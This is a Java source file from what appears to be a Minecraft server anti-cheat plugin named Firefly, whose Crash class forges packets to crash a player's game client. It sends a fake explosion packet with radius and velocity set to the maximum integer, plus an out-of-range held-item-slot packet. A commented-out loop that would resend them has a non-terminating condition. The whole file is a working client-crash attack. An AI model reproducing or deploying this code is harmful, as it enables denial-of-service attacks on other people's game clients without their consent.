package ac.firefly.util.interaction;


import ac.firefly.Firefly;
import com.comphenix.packetwrapper.*;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

public class Crash {

    public static void crashPlayer(Player p) {
        WrapperPlayServerExplosion fakeExplosion = new WrapperPlayServerExplosion();

        fakeExplosion.setX(p.getLocation().getX());
        fakeExplosion.setY(p.getLocation().getY());
        fakeExplosion.setZ(p.getLocation().getZ());
        fakeExplosion.setRadius(Integer.MAX_VALUE);
        fakeExplosion.setPlayerVelocityX(Integer.MAX_VALUE);
        fakeExplosion.setPlayerVelocityY(Integer.MAX_VALUE);
        fakeExplosion.setPlayerVelocityZ(Integer.MAX_VALUE);

        WrapperPlayServerHeldItemSlot pk = new WrapperPlayServerHeldItemSlot();

        pk.setSlot(Integer.MAX_VALUE);

        new BukkitRunnable() {
            @Override
            public void run() {
                fakeExplosion.sendPacket(p);
                pk.sendPacket(p);
                /*for(int i = 0; 1 < 25; i++) {
                    pk.sendPacket(p);
                    fakeExplosion.sendPacket(p);
                }*/
            }
        }.runTaskAsynchronously(Firefly.instance);
    }
}
